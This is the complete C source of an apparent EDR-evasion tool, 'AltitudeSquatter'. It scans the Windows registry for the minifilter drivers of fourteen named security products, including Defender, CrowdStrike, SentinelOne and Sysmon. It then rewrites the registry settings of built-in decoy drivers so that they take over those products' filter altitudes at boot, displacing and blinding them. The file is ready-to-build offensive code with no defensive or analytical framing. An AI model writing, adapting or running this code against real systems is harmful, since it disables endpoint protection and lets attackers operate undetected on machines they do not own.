#include <windows.h>
#include <stdio.h>
#include <string.h>

static BOOL SetRegSz(LPCSTR subKey, LPCSTR name, LPCSTR value)
{
    HKEY hKey;
    LONG rc = RegOpenKeyExA(HKEY_LOCAL_MACHINE, subKey, 0, KEY_SET_VALUE, &hKey);
    if (rc != ERROR_SUCCESS) {
        printf("    [-] Open %s failed (error %ld)\n", subKey, rc);
        return FALSE;
    }
    rc = RegSetValueExA(hKey, name, 0, REG_SZ, (const BYTE *)value, (DWORD)strlen(value) + 1);
    RegCloseKey(hKey);
    if (rc != ERROR_SUCCESS) {
        printf("    [-] Set %s failed (error %ld)\n", name, rc);
        return FALSE;
    }
    return TRUE;
}

static BOOL SetRegDword(LPCSTR subKey, LPCSTR name, DWORD value)
{
    HKEY hKey;
    LONG rc = RegOpenKeyExA(HKEY_LOCAL_MACHINE, subKey, 0, KEY_SET_VALUE, &hKey);
    if (rc != ERROR_SUCCESS) {
        printf("    [-] Open %s failed (error %ld)\n", subKey, rc);
        return FALSE;
    }
    rc = RegSetValueExA(hKey, name, 0, REG_DWORD, (const BYTE *)&value, sizeof(value));
    RegCloseKey(hKey);
    if (rc != ERROR_SUCCESS) {
        printf("    [-] Set %s failed (error %ld)\n", name, rc);
        return FALSE;
    }
    return TRUE;
}

static BOOL DeleteRegValue(LPCSTR subKey, LPCSTR name)
{
    HKEY hKey;
    LONG rc = RegOpenKeyExA(HKEY_LOCAL_MACHINE, subKey, 0, KEY_SET_VALUE, &hKey);
    if (rc != ERROR_SUCCESS) {
        printf("    [-] Open %s\\%s failed (error %ld)\n", subKey, name, rc);
        return FALSE;
    }
    rc = RegDeleteValueA(hKey, name);
    RegCloseKey(hKey);
    if (rc != ERROR_SUCCESS && rc != ERROR_FILE_NOT_FOUND) {
        printf("    [-] Delete %s failed (error %ld)\n", name, rc);
        return FALSE;
    }
    return TRUE;
}

static BOOL SvcKeyExists(const char *svcName)
{
    char subKey[512];
    _snprintf(subKey, sizeof(subKey), "SYSTEM\\CurrentControlSet\\Services\\%s", svcName);
    HKEY hKey;
    LONG rc = RegOpenKeyExA(HKEY_LOCAL_MACHINE, subKey, 0, KEY_READ, &hKey);
    if (rc == ERROR_SUCCESS) { RegCloseKey(hKey); return TRUE; }
    return FALSE;
}

typedef struct {
    const char *edr;
    const char *filter;
    const char *altitude;
    const char *decoy;
    const char *decoyInstance;
} Target;

static Target targets[] = {
    {"defender",    "WdFilter",        "328010", "npsvctrig",  "npsvctrig"},
    {"mssecflt",    "MsSecFlt",        "385600", "WIMMount",   "WIMMount"},
    {"sysmon",      "SysmonDrv",       "385201", "storqosflt", "storqosflt"},
    {"crowdstrike", "csagent",         "328010", "npsvctrig",  "npsvctrig"},
    {"sentinelone", "SentinelMonitor", "385200", "CldFlt",     "CldFlt"},
    {"carbonblack", "CbDefenseFilter", "328000", "Wof",        "Wof"},
    {"sophos",      "SophosED",        "326000", "wcifs",      "wcifs"},
    {"eset",        "eamonm",          "328000", "Wof",        "Wof"},
    {"kaspersky",   "klif",            "389800", "FileCrypt",  "FileCrypt"},
    {"trendmicro",  "TmFileEncDec",    "385300", "bindflt",    "bindflt"},
    {"elastic",     "ElasticEndpoint", "385700", "luafv",      "luafv"},
    {"cortex",      "CyveraK",         "328010", "npsvctrig",  "npsvctrig"},
    {"cylance",     "CylanceDrv",      "385100", "storqosflt", "storqosflt"},
    {"malwarebytes","MBAMSwissArmy",   "385100", "storqosflt", "storqosflt"},
};
#define TARGET_COUNT (sizeof(targets) / sizeof(targets[0]))

static int stricmp_local(const char *a, const char *b)
{
    while (*a && *b) {
        char ca = (*a >= 'A' && *a <= 'Z') ? *a + 32 : *a;
        char cb = (*b >= 'A' && *b <= 'Z') ? *b + 32 : *b;
        if (ca != cb) return ca - cb;
        a++; b++;
    }
    return *a - *b;
}

static void PrintUsage(void)
{
    printf("Usage: AltitudeSquatter.exe <command> [target ...]\n\n");
    printf("Commands:\n");
    printf("  list            Show detected EDR minifilters\n");
    printf("  all             Squat all detected EDR filters\n");
    printf("  restore         Restore all decoy drivers to defaults\n");
    printf("  <target>        Squat specific EDR (multiple allowed)\n");
    printf("  restore <target> Restore specific decoy to defaults\n\n");
    printf("Targets:\n");
    for (int i = 0; i < (int)TARGET_COUNT; i++)
        printf("  %-14s  %s (altitude %s)\n", targets[i].edr, targets[i].filter, targets[i].altitude);
}

static BOOL DoSquat(Target *t)
{
    char svcKey[512], instKey[512];
    _snprintf(svcKey, sizeof(svcKey), "SYSTEM\\CurrentControlSet\\Services\\%s", t->decoy);
    _snprintf(instKey, sizeof(instKey), "SYSTEM\\CurrentControlSet\\Services\\%s\\Instances\\%s",
              t->decoy, t->decoyInstance);

    printf("[*] %s -> altitude %s (displaces %s)\n", t->decoy, t->altitude, t->filter);

    if (!SvcKeyExists(t->decoy)) {
        printf("    [-] Decoy driver %s not found\n\n", t->decoy);
        return FALSE;
    }

    BOOL s1 = SetRegSz(instKey, "Altitude", t->altitude);
    BOOL s2 = SetRegDword(svcKey, "Start", 0);
    BOOL s3 = SetRegSz(svcKey, "Group", "FSFilter Bottom");

    if (s1 && s2 && s3) {
        printf("    [+] %s squatted\n\n", t->filter);
        return TRUE;
    }
    printf("    [-] Partial failure\n\n");
    return FALSE;
}

static BOOL DoRestore(Target *t)
{
    char svcKey[512], instKey[512];
    _snprintf(svcKey, sizeof(svcKey), "SYSTEM\\CurrentControlSet\\Services\\%s", t->decoy);
    _snprintf(instKey, sizeof(instKey), "SYSTEM\\CurrentControlSet\\Services\\%s\\Instances\\%s",
              t->decoy, t->decoyInstance);

    printf("[*] Restoring %s (delete Altitude, delete Group, Start -> 3)\n", t->decoy);

    if (!SvcKeyExists(t->decoy)) {
        printf("    [-] Driver %s not found\n\n", t->decoy);
        return FALSE;
    }

    BOOL s1 = DeleteRegValue(instKey, "Altitude");
    BOOL s2 = SetRegDword(svcKey, "Start", 3);
    BOOL s3 = DeleteRegValue(svcKey, "Group");

    if (s1 && s2 && s3) {
        printf("    [+] %s restored\n\n", t->decoy);
        return TRUE;
    }
    printf("    [-] Partial failure\n\n");
    return FALSE;
}

static Target *FindTarget(const char *name)
{
    for (int i = 0; i < (int)TARGET_COUNT; i++) {
        if (stricmp_local(name, targets[i].edr) == 0 ||
            stricmp_local(name, targets[i].filter) == 0)
            return &targets[i];
    }
    return NULL;
}

int main(int argc, char *argv[])
{
    printf("[*] Minifilter altitude squatter\n\n");

    if (argc < 2) {
        PrintUsage();
        return 0;
    }

    if (stricmp_local(argv[1], "list") == 0) {
        printf("[*] Scanning for EDR minifilters...\n\n");
        int found = 0;
        for (int i = 0; i < (int)TARGET_COUNT; i++) {
            if (SvcKeyExists(targets[i].filter)) {
                printf("  [!] %-14s  %s (altitude %s)\n", targets[i].edr, targets[i].filter, targets[i].altitude);
                found++;
            }
        }
        if (!found) printf("  [+] No known EDR minifilters detected\n");
        else printf("\n[*] %d EDR minifilter(s) detected\n", found);
        return 0;
    }

    if (stricmp_local(argv[1], "restore") == 0) {
        if (argc > 2) {
            for (int a = 2; a < argc; a++) {
                Target *t = FindTarget(argv[a]);
                if (t) DoRestore(t);
                else printf("[-] Unknown target: %s\n\n", argv[a]);
            }
        } else {
            printf("[*] Restoring all decoy drivers...\n\n");
            BOOL seen[TARGET_COUNT];
            for (int i = 0; i < (int)TARGET_COUNT; i++) seen[i] = FALSE;
            int ok = 0;
            for (int i = 0; i < (int)TARGET_COUNT; i++) {
                BOOL dup = FALSE;
                for (int j = 0; j < i; j++)
                    if (stricmp_local(targets[i].decoy, targets[j].decoy) == 0) { dup = TRUE; break; }
                if (dup) continue;
                if (SvcKeyExists(targets[i].decoy))
                    if (DoRestore(&targets[i])) ok++;
            }
            printf("[+] %d driver(s) restored. Reboot to apply.\n", ok);
        }
        return 0;
    }

    if (stricmp_local(argv[1], "all") == 0) {
        int total = 0, ok = 0;
        for (int i = 0; i < (int)TARGET_COUNT; i++) {
            if (SvcKeyExists(targets[i].filter)) {
                total++;
                if (DoSquat(&targets[i])) ok++;
            }
        }
        if (total == 0) {
            printf("[+] No known EDR minifilters detected\n");
            return 0;
        }
        if (ok == total)
            printf("[+] All %d targets squatted. Reboot to apply.\n", ok);
        else
            printf("[!] %d/%d succeeded. Reboot to apply.\n", ok, total);
        return ok == total ? 0 : 1;
    }

    for (int a = 1; a < argc; a++) {
        Target *t = FindTarget(argv[a]);
        if (t) DoSquat(t);
        else printf("[-] Unknown target: %s\n\n", argv[a]);
    }

    printf("[*] Reboot to apply changes.\n");
    return 0;
}
